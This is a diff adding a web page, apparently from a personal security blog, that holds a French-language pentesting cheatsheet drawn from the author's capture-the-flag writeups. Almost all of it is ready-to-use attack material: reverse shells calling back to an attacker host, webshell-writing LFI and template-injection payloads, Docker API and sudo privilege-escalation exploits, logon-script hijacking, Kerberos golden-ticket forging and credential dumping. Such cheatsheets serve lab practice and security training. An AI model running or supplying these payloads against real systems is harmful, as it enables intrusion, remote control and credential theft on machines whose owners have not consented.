@@ -1,0 +1,752 @@
+---
+import Layout from '../layouts/Layout.astro'
+---
+<Layout title="Cheatsheet">
+
+  <div style="margin-bottom:2rem;">
+    <div style="color:#334155; font-size:0.8rem; margin-bottom:0.5rem;">$ cat cheatsheet.md</div>
+    <h1 style="font-size:2rem; font-weight:700; color:#e2e8f0; margin-bottom:0.25rem;">Cheatsheet</h1>
+    <p style="color:#475569; font-size:0.85rem;">Toutes les commandes utilisées dans mes writeups — organisées par catégorie</p>
+  </div>
+
+  <div style="display:flex; flex-wrap:wrap; gap:0.5rem; margin-bottom:2rem;" id="filters">
+    <button class="filter-btn active" data-filter="all">Tout</button>
+    <button class="filter-btn" data-filter="recon">Recon</button>
+    <button class="filter-btn" data-filter="web">Web</button>
+    <button class="filter-btn" data-filter="ad">Active Directory</button>
+    <button class="filter-btn" data-filter="privesc">Privilege Escalation</button>
+    <button class="filter-btn" data-filter="crack">Cracking</button>
+    <button class="filter-btn" data-filter="pivoting">Pivoting</button>
+    <button class="filter-btn" data-filter="shell">Shells</button>
+    <button class="filter-btn" data-filter="tools">Outils divers</button>
+  </div>
+
+  <div id="cheatsheet-content">
+
+    <div class="cs-section" data-cat="recon">
+      <h2 class="cs-title">🔍 Reconnaissance</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">Nmap — scan complet</div>
+        <pre class="cs-code">nmap -sC -sV -p- --min-rate 5000 -oN scan.txt &lt;IP&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Nmap — rapide avec scripts</div>
+        <pre class="cs-code">nmap -sC -sV -T4 &lt;IP&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Nmap — ports spécifiques</div>
+        <pre class="cs-code">nmap -sCV -p 21,22,80,443,445,8080,8888 &lt;IP&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">ffuf — fuzzing de répertoires</div>
+        <pre class="cs-code">ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -u http://&lt;TARGET&gt;/FUZZ -fc 301,302,404 -e .php,.html,.txt</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">ffuf — fuzzing de vhosts</div>
+        <pre class="cs-code">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://&lt;TARGET&gt; -H "Host: FUZZ.&lt;DOMAIN&gt;" -fs &lt;TAILLE_DEFAULT&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">ffuf — fuzzing de sous-domaines</div>
+        <pre class="cs-code">ffuf -u http://&lt;DOMAIN&gt; -H 'Host: FUZZ.&lt;DOMAIN&gt;' -fc 302 \
+     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">gobuster — répertoires</div>
+        <pre class="cs-code">gobuster dir -u http://&lt;TARGET&gt; \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -x php,html,txt -t 50</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Ajout /etc/hosts</div>
+        <pre class="cs-code">echo "&lt;IP&gt; &lt;DOMAIN&gt; &lt;SUBDOMAIN&gt;" | sudo tee -a /etc/hosts
+# Mise à jour IP après reset HTB :
+sudo sed -i 's/&lt;OLD_IP&gt;/&lt;NEW_IP&gt;/g' /etc/hosts</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Synchronisation NTP (Kerberos)</div>
+        <pre class="cs-code">sudo ntpdate -u &lt;DC_IP&gt;</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="web">
+      <h2 class="cs-title">🌐 Web & Application</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">SQLmap — scan basique</div>
+        <pre class="cs-code">sqlmap -r request.req --batch --level=3 --risk=2 --dbs</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">SQLmap — dump de table</div>
+        <pre class="cs-code">sqlmap -r request.req --batch -D &lt;DB&gt; -T &lt;TABLE&gt; -C 'id,username,password' --dump</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">SQLmap — lecture de fichier (Second-Order SQLi)</div>
+        <pre class="cs-code">sqlmap -r request.req --batch --file-read=/etc/passwd
+sqlmap -r request.req --batch --file-read=/etc/apache2/sites-enabled/000-default.conf</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">LFI — bypass str_replace('../', '')</div>
+        <pre class="cs-code"># Bypass avec ....//
+# ....//  →  str_replace('../', '')  →  ../
+curl "http://&lt;TARGET&gt;/download.php?f=....//....//....//etc/passwd"</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">LFI via pearcmd.php (RCE)</div>
+        <pre class="cs-code"># PHP-PEAR installé → pearcmd.php lit les args depuis la query string
+# Écriture webshell dans le webroot public
+curl -g 'http://&lt;TARGET&gt;/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-create+/&lt;?=system($_GET[0]);?&gt;+/var/www/public/cmd.php'
+
+# Exécution directe
+curl -s 'http://&lt;TARGET&gt;/cmd.php?0=id'</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">SSTI Twig — test et payload RCE</div>
+        <pre class="cs-code"># Test : injecter dans un champ rendu par Twig
+# Payload : &#123;&#123;7*7&#125;&#125;  &#x2192;  r&eacute;sultat : 49
+
+# RCE via filter('system')
+&#123;&#123; ["commande"]|filter('system') &#125;&#125;
+
+# Exemple : &eacute;criture webshell
+&#123;&#123; ["echo webshell.php"]|filter('system') &#125;&#125;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Python f-string injection — bypass regex</div>
+        <pre class="cs-code"># Encoder la commande en Base64 pour &eacute;liminer espaces/caract&egrave;res bloqu&eacute;s
+echo -n 'install -o root -m 4755 /bin/bash /tmp/.sh' | base64
+# aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo
+
+# Payload inject&eacute; dans un champ &eacute;valu&eacute; par eval(f-string)
+&#123;__import__("os").popen(__import__("base64").b64decode("BASE64_PAYLOAD").decode()).read()&#125;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">git-dumper — extraction dépôt .git exposé</div>
+        <pre class="cs-code">git-dumper http://&lt;TARGET&gt;/.git/ ./local_repo
+cd local_repo
+git log --oneline
+git diff HEAD~1 HEAD   # Voir les changements entre commits</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">AWS S3 — énumération bucket local</div>
+        <pre class="cs-code">aws configure  # Configurer les credentials récupérés
+aws --endpoint-url http://&lt;TARGET&gt;:54321 s3 ls
+aws --endpoint-url http://&lt;TARGET&gt;:54321 s3 ls s3://&lt;BUCKET&gt;/
+aws --endpoint-url http://&lt;TARGET&gt;:54321 s3 cp s3://&lt;BUCKET&gt;/file ./file</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">curl — exploitation API Docker (CVE-2025-9074)</div>
+        <pre class="cs-code"># Scanner sous-réseau Docker Desktop pour trouver l'API
+for i in $(seq 1 254); do
+  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
+   | grep -q "ApiVersion" && echo "192.168.65.$i OPEN") &
+done; wait
+
+# Créer un conteneur via l'API (monter le filesystem hôte)
+curl -X POST -H "Content-Type: application/json" \
+  -d '&#123;"Image":"alpine:latest","Cmd":["/bin/sh","-c","cat /mnt/root/root.txt"],"HostConfig":&#123;"Binds":["/:/mnt/root"]&#125;&#125;' \
+  http://&lt;DOCKER_API&gt;:2375/containers/create?name=pwned
+
+curl -X POST http://&lt;DOCKER_API&gt;:2375/containers/&lt;ID&gt;/start
+curl http://&lt;DOCKER_API&gt;:2375/containers/&lt;ID&gt;/logs?stdout=true</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">XXE via SOAP (Apache CXF CVE-2022-46364)</div>
+        <pre class="cs-code"># Le payload xop:Include force le serveur à lire un fichier local
+# et le retourner en base64 dans la réponse SOAP
+python3 xxe_cxf.py /etc/systemd/system/hoverfly.service</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Hoverfly — RCE via middleware (CVE-2024-45388)</div>
+        <pre class="cs-code">TOKEN=$(curl -s -X POST http://&lt;TARGET&gt;:8888/api/token-auth \
+  -H 'Content-Type: application/json' \
+  -d '&#123;"username":"admin","password":"&lt;PASS&gt;"&#125;' \
+  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
+
+# Injecter reverse shell via middleware
+curl -s -X PUT http://&lt;TARGET&gt;:8888/api/v2/hoverfly/middleware \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '&#123;"binary":"python3","script":"&lt;BASE64_SCRIPT&gt;"&#125;'
+
+# Déclencher via le proxy
+curl -s -x http://admin:&lt;PASS&gt;@&lt;TARGET&gt;:8500 http://example.com</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="ad">
+      <h2 class="cs-title">🏰 Active Directory</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">netexec / nxc — énumération SMB</div>
+        <pre class="cs-code">nxc smb &lt;IP&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' --shares
+nxc smb &lt;IP&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' -M spider_plus
+nxc smb &lt;IP&gt; -u 'guest' -p '' --rid-brute   # Sans auth
+nxc winrm &lt;IP&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' # Test WinRM</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">smbclient — téléchargement récursif</div>
+        <pre class="cs-code">smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U '&lt;DOMAIN&gt;\&lt;USER&gt;%&lt;PASS&gt;' \
+  -c 'recurse ON; prompt OFF; mget *'
+
+# Upload d'un fichier
+smbclient //&lt;IP&gt;/SYSVOL -U "&lt;USER&gt;%&lt;PASS&gt;" \
+  -c "cd &lt;DOMAIN&gt;\scripts; put /tmp/payload.bat payload.bat"</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">bloodyAD — ACLs et modifications AD</div>
+        <pre class="cs-code"># Lister les objets accessibles en écriture
+bloodyAD --host &lt;DOMAIN&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' get writable
+
+# Modifier un attribut (ex: scriptPath)
+bloodyAD --host &lt;DOMAIN&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' \
+  set object "CN=&lt;USER&gt;,CN=Users,DC=..." &lt;ATTRIBUT&gt; -v &lt;VALEUR&gt;
+
+# Shadow Credentials sur gMSA
+bloodyAD -H &lt;DC&gt; -d &lt;DOMAIN&gt; -u '&lt;USER&gt;' -k \
+  add shadowCredentials '&lt;GMSA_ACCOUNT&gt;$'
+
+# S'ajouter à un groupe (AddSelf)
+Add-ADGroupMember -Identity "&lt;GROUP&gt;" -Members "&lt;USER&gt;"</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Kerberos — obtention de TGT</div>
+        <pre class="cs-code">getTGT.py '&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;'
+export KRB5CCNAME=&lt;USER&gt;.ccache
+
+# Avec hash NT (Pass-the-Hash Kerberos)
+getTGT.py '&lt;DOMAIN&gt;/&lt;USER&gt;' -hashes :&lt;NT_HASH&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">RBCD — Resource-Based Constrained Delegation</div>
+        <pre class="cs-code"># 1. Créer un faux compte machine
+impacket-addcomputer &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;' \
+  -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip &lt;DC_IP&gt;
+
+# 2. Configurer RBCD sur la machine cible
+Set-ADComputer &lt;TARGET_MACHINE&gt; -PrincipalsAllowedToDelegateToAccount FAKE$
+
+# 3. Obtenir un ticket S4U
+impacket-getST &lt;DOMAIN&gt;/'FAKE$':'FakePass123!' \
+  -spn cifs/&lt;TARGET&gt;.&lt;DOMAIN&gt; -impersonate Administrator -dc-ip &lt;DC_IP&gt;
+export KRB5CCNAME=Administrator.ccache
+
+# 4. Utiliser le ticket
+impacket-psexec -k -no-pass -dc-ip &lt;DC_IP&gt; -target-ip &lt;TARGET_IP&gt; \
+  &lt;DOMAIN&gt;/Administrator@&lt;TARGET&gt;.&lt;DOMAIN&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">ADIDNS Poisoning</div>
+        <pre class="cs-code"># Créer un record DNS malveillant dans AD
+python3 dnstool.py -u '&lt;DOMAIN&gt;\&lt;USER&gt;' -p '&lt;PASS&gt;' \
+  -r &lt;HOSTNAME&gt; --data &lt;LHOST&gt; --action add --type A &lt;DC_IP&gt;
+# Lancer Responder pour capturer l'auth
+sudo responder -I tun0</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">RODC — Golden Ticket + KeyList Attack</div>
+        <pre class="cs-code"># 1. Dump de la clé krbtgt_XXXX (dans Mimikatz)
+privilege::debug
+lsadump::lsa /inject /name:krbtgt_&lt;RODC_ID&gt;
+# 2. Modifier la PRP (PowerView)
+Set-DomainObject -Identity &lt;RODC_MACHINE&gt;$ -Set @&#123;
+  'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC...',
+                                'CN=Administrator,...')
+&#125;
+Set-DomainObject -Identity &lt;RODC_MACHINE&gt;$ -Clear 'msDS-NeverRevealGroup'
+
+# 3. Forger le Golden Ticket RODC (Rubeus)
+.\Rubeus.exe golden /rodcNumber:&lt;RODC_ID&gt; \
+  /flags:forwardable,renewable,enc_pa_rep /nowrap \
+  /aes256:&lt;AES256_KEY&gt; /user:Administrator /id:500 \
+  /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /outfile:ticket.kirbi
+
+# 4. KeyList Attack
+.\Rubeus.exe asktgs /enctype:aes256 /keyList \
+  /service:krbtgt/&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ticket:ticket.kirbi
+
+# 5. Convertir et utiliser
+impacket-ticketConverter ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+nxc smb &lt;DC&gt; --use-kcache --ntds</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Evil-WinRM — connexion</div>
+        <pre class="cs-code"># Mot de passe
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -p '&lt;PASS&gt;'
+
+# Hash NT (Pass-the-Hash)
+evil-winrm -i &lt;IP&gt; -u &lt;USER&gt; -H '&lt;NT_HASH&gt;'</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Impacket — divers</div>
+        <pre class="cs-code"># MSSQL
+impacket-mssqlclient &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;IP&gt; -port &lt;PORT&gt; -windows-auth
+
+# NTDS dump
+impacket-secretsdump &lt;DOMAIN&gt;/Administrator:'&lt;PASS&gt;'@&lt;DC_IP&gt;
+
+# Ticket Kerberos
+impacket-ticketConverter ticket.kirbi ticket.ccache
+
+# PsExec
+impacket-psexec &lt;DOMAIN&gt;/&lt;USER&gt;:'&lt;PASS&gt;'@&lt;IP&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">CVE-2025-24071 — NTLM Hash Leak via ZIP</div>
+        <pre class="cs-code"># Créer le fichier .library-ms malveillant
+cat > evil.library-ms &lt;&lt; 'EOF'
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+  &lt;searchConnectorDescriptionList&gt;
+    &lt;searchConnectorDescription&gt;
+      &lt;simpleLocation&gt;&lt;url&gt;\\&lt;LHOST&gt;\share&lt;/url&gt;&lt;/simpleLocation&gt;
+    &lt;/searchConnectorDescription&gt;
+  &lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+EOF
+
+zip payload.zip evil.library-ms
+sudo responder -I tun0   # Capturer le hash</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="privesc">
+      <h2 class="cs-title">⬆️ Privilege Escalation</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">Énumération sudo</div>
+        <pre class="cs-code">sudo -l</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Recherche fichiers avec permissions inhabituelles</div>
+        <pre class="cs-code"># Fichiers world-writable
+find /usr/bin /bin /usr/sbin /sbin -writable 2>/dev/null
+
+# Fichiers SUID
+find / -perm -4000 2>/dev/null
+
+# Fichiers owned by root mais writables
+find / -user root -writable 2>/dev/null | grep -v proc</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Docker Group Abuse</div>
+        <pre class="cs-code">id   # Vérifier groupe docker ou operator
+
+# Si groupe operator → passer au groupe docker
+newgrp docker
+id
+
+docker images   # Lister les images disponibles
+
+# Monter le filesystem hôte
+docker run -v /:/hostfs --rm --entrypoint sh --user root &lt;IMAGE&gt; \
+  -c "cat /hostfs/root/root.txt"
+
+# Obtenir un shell root
+docker run -v /:/hostfs --rm --entrypoint sh --user root &lt;IMAGE&gt; \
+  -c "chroot /hostfs /bin/bash"</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Bash Binary Hijacking (permissions 777)</div>
+        <pre class="cs-code"># Vérifier les permissions
+ls -la /usr/bin/bash
+
+# Sauvegarder bash
+cp /usr/bin/bash /tmp/bash.bak
+
+# Créer le payload
+printf '#!/bin/sh\ncp /bin/bash-static /tmp/rootsh\nchmod 4755 /tmp/rootsh\n' > /tmp/pay.sh
+chmod +x /tmp/pay.sh
+
+# Remplacer bash (contourne "text file busy")
+python3 -c "
+import os
+data = open('/tmp/pay.sh','rb').read()
+fd = os.open('/usr/bin/bash', os.O_WRONLY | os.O_TRUNC)
+os.write(fd, data)
+os.close(fd)
+"
+
+# Déclencher via sudo
+sudo /opt/script.sh
+
+# Shell root
+/tmp/rootsh -p
+
+# RESTAURER BASH
+cp /tmp/bash.bak /usr/bin/bash</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Facter — sudo abuse Ruby (GTFOBins)</div>
+        <pre class="cs-code">cat > /tmp/pwn.rb &lt;&lt; 'EOF'
+Facter.add(:pwn) do
+  setcode do
+    exec("/bin/bash -p")
+  end
+end
+EOF
+
+sudo facter --custom-dir=/tmp pwn</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">TarSlip — CVE-2025-4138</div>
+        <pre class="cs-code"># tarfile.extractall() sans validation = écriture arbitraire en root
+# Générer une clé SSH
+ssh-keygen -t ed25519 -f ~/key -N ""
+
+# Construire le TAR malveillant (injecte authorized_keys dans /root/.ssh/)
+python3 exploit_tarslip.py
+# → /tmp/malicious.tar
+
+# Déclencher via sudo
+sudo python3 /opt/restore.py -b malicious.tar -r restore
+
+# Connexion root
+ssh root@127.0.0.1 -i ~/key</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Cobbler XML-RPC Auth Bypass (CVE-2024-47533)</div>
+        <pre class="cs-code">python3 &lt;&lt; 'EOF'
+import xmlrpc.client
+s = xmlrpc.client.ServerProxy('http://127.0.0.1:25151/RPC2')
+# username vide + password ENTIER -1 = bypass
+t = s.login('', -1)
+print('Token admin:', t)
+EOF
+
+# Puis : write_autoinstall_template() + template Cheetah
+# → exécution Python en tant que root via cobblerd</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Logon Script Hijacking (SYSVOL)</div>
+        <pre class="cs-code"># Générer payload PowerShell en Base64 UTF-16LE (obligatoire)
+PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("&lt;LHOST&gt;",&lt;LPORT&gt;);...'
+B64=$(echo "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
+
+# Créer le .bat
+cat > /tmp/payload.bat &lt;&lt; EOF
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $B64
+EOF
+
+# Upload dans SYSVOL et modifier scriptPath
+smbclient //&lt;DC&gt;/SYSVOL -U "&lt;USER&gt;%&lt;PASS&gt;" \
+  -c "cd &lt;DOMAIN&gt;\scripts; put /tmp/payload.bat payload.bat"
+
+bloodyAD --host &lt;DOMAIN&gt; -u '&lt;USER&gt;' -p '&lt;PASS&gt;' \
+  set object "CN=&lt;TARGET_USER&gt;,..." scriptPath -v payload.bat</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="crack">
+      <h2 class="cs-title">🔓 Password Cracking</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">Hashcat — modes courants</div>
+        <pre class="cs-code"># MD5
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# SHA256
+hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
+
+# SHA256 salé sha256($pass.$salt) — Wing FTP
+hashcat -m 1410 "&lt;HASH&gt;:WingFTP" /usr/share/wordlists/rockyou.txt
+
+# bcrypt
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+
+# NTLMv2
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
+
+# PBKDF2-HMAC-SHA256 — Mirth Connect
+hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt --force</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">John the Ripper</div>
+        <pre class="cs-code"># Passphrase SSH
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Hash divers
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=&lt;FORMAT&gt;</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Extraction hash PBKDF2 depuis Base64 (Mirth Connect)</div>
+        <pre class="cs-code">python3 -c "
+import base64
+data = base64.b64decode('&lt;HASH_BASE64&gt;')
+salt = data[:8]
+dk   = data[8:]
+print(f'sha256:600000:&#123;base64.b64encode(salt).decode()&#125;:&#123;base64.b64encode(dk).decode()&#125;')
+"</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Responder — capture NTLMv2/cleartext</div>
+        <pre class="cs-code">sudo responder -I tun0
+
+# Après capture NTLMv2 :
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="pivoting">
+      <h2 class="cs-title">🔀 Pivoting & Tunneling</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">Ligolo-ng — tunnel vers réseau interne</div>
+        <pre class="cs-code"># Kali — setup interface
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Machine cible (Windows/Linux)
+.\agent.exe -connect &lt;KALI_IP&gt;:11601 -ignore-cert
+
+# Console Ligolo
+# session → 1 → start
+
+# Ajouter la route vers le réseau interne
+sudo ip route add &lt;INTERNAL_NETWORK&gt;/24 dev ligolo</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">SSH — port forwarding local</div>
+        <pre class="cs-code"># Accéder à un port interne via SSH
+ssh &lt;USER&gt;@&lt;TARGET&gt; -L &lt;LOCAL_PORT&gt;:127.0.0.1:&lt;REMOTE_PORT&gt;
+
+# Exemple : API Cobbler interne
+ssh cobble@&lt;IP&gt; -L 25151:127.0.0.1:25151</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Chisel — tunnel HTTP</div>
+        <pre class="cs-code"># Kali (serveur)
+./chisel server -p 8888 --reverse
+
+# Cible (client)
+.\chisel.exe client &lt;KALI_IP&gt;:8888 R:&lt;LOCAL_PORT&gt;:127.0.0.1:&lt;REMOTE_PORT&gt;</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="shell">
+      <h2 class="cs-title">💻 Shells & Stabilisation</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">Reverse shells courants</div>
+        <pre class="cs-code"># Bash
+bash -c 'bash -i >& /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0>&1'
+
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;LHOST&gt;",&lt;LPORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PowerShell (encodé UTF-16LE pour -EncodedCommand)
+PAYLOAD='$client=New-Object System.Net.Sockets.TCPClient("&lt;LHOST&gt;",&lt;LPORT&gt;);...'
+B64=$(echo "$PAYLOAD" | iconv -t UTF-16LE | base64 -w0)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $B64</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Stabilisation shell Linux</div>
+        <pre class="cs-code">python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+export SHELL=/bin/bash</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Listeners</div>
+        <pre class="cs-code">nc -lvnp &lt;PORT&gt;
+# Metasploit
+use exploit/multi/handler
+set payload cmd/unix/reverse_bash
+set LHOST &lt;IP&gt; && set LPORT &lt;PORT&gt;
+run</pre>
+      </div>
+
+    </div>
+
+    <div class="cs-section" data-cat="tools">
+      <h2 class="cs-title">🛠️ Outils Divers</h2>
+
+      <div class="cs-card">
+        <div class="cs-label">Metasploit — CVE-2023-43208 Mirth Connect</div>
+        <pre class="cs-code">use exploit/multi/http/mirth_connect_cve_2023_43208
+set RHOSTS &lt;IP&gt; && set RPORT 443 && set SSL true
+set LHOST &lt;LHOST&gt; && set LPORT 4444
+set payload cmd/unix/reverse_bash   # IMPORTANT : x64 incompatible
+set FETCH_COMMAND CURL
+run</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">strings — extraction depuis binaire .NET</div>
+        <pre class="cs-code"># Strings Unicode (assemblies .NET)
+strings -e l &lt;BINARY&gt; | grep -iE 'sql|pass|user|server|key'
+
+# Strings ASCII
+strings &lt;BINARY&gt; | grep -iE 'sql|pass|user'</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Mimikatz — dump Kerberos</div>
+        <pre class="cs-code">privilege::debug
+lsadump::lsa /inject /name:krbtgt_&lt;RODC_ID&gt;
+lsadump::dcsync /user:Administrator</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">certipy — ADCS énumération</div>
+        <pre class="cs-code">certipy find -u '&lt;USER&gt;@&lt;DOMAIN&gt;' -p '&lt;PASS&gt;' -dc-ip &lt;DC_IP&gt;
+certipy req -u '&lt;USER&gt;@&lt;DOMAIN&gt;' -p '&lt;PASS&gt;' -ca '&lt;CA_NAME&gt;' -template '&lt;TEMPLATE&gt;'</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">BloodHound — collecte</div>
+        <pre class="cs-code">bloodhound-python -u &lt;USER&gt; -p '&lt;PASS&gt;' -d &lt;DOMAIN&gt; -ns &lt;DC_IP&gt; -c all</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">Serveur HTTP Python rapide</div>
+        <pre class="cs-code">python3 -m http.server 8000
+python3 -m http.server 8888   # Pour transfert de fichiers</pre>
+      </div>
+
+      <div class="cs-card">
+        <div class="cs-label">EtherNet/IP — socket brut CIP</div>
+        <pre class="cs-code">import socket, struct
+
+def register_session(s):
+    reg = b'\x65\x00\x04\x00' + b'\x00'*20 + b'\x01\x00\x00\x00'
+    s.send(reg)
+    return s.recv(1024)[4:8]
+
+def read_tag(s, session, tag_name, count=50):
+    tag = tag_name.encode('utf-8')
+    epath = bytes([0x91, len(tag)]) + tag
+    cip = bytes([0x4C, len(epath)//2]) + epath + struct.pack('&lt;H', count)
+    cpf = b'\x02\x00\x00\x00\x00\x00\xb2\x00' + struct.pack('&lt;H', len(cip)) + cip
+    payload = b'\x00\x00\x00\x00\x0a\x00' + cpf
+    header = b'\x6f\x00' + struct.pack('&lt;H', len(payload)) + session + b'\x00'*16
+    s.send(header + payload)
+    return s.recv(4096)[40:].decode('utf-8', errors='ignore')
+
+s = socket.socket()
+s.connect(('&lt;TARGET&gt;', &lt;PORT&gt;))
+session = register_session(s)
+print(read_tag(s, session, 'FLAG', 50))</pre>
+      </div>
+
+    </div>
+
+  </div>
+
+</Layout>
+
+<style>
+  .cs-section { margin-bottom: 2.5rem; }
+  .cs-title {
+    color: var(--cyber);
+    font-size: 1.05rem;
+    font-weight: 700;
+    border-bottom: 1px solid rgba(0,255,157,0.2);
+    padding-bottom: 0.4rem;
+    margin-bottom: 1rem;
+  }
+  .cs-card {
+    background: var(--bg-800);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 0.75rem;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .cs-card:hover { border-color: rgba(0,255,157,0.3); }
+  .cs-label {
+    color: #64748b;
+    font-size: 0.75rem;
+    padding: 0.5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+  .cs-code {
+    margin: 0;
+    padding: 0.9rem 1rem;
+    background: #050508;
+    color: #cbd5e1;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    line-height: 1.8;
+    white-space: pre;
+    overflow-x: auto;
+  }
+</style>
+
+<script>
+  const buttons = document.querySelectorAll('.filter-btn')
+  const sections = document.querySelectorAll('.cs-section')
+
+  buttons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      const filter = btn.getAttribute('data-filter')
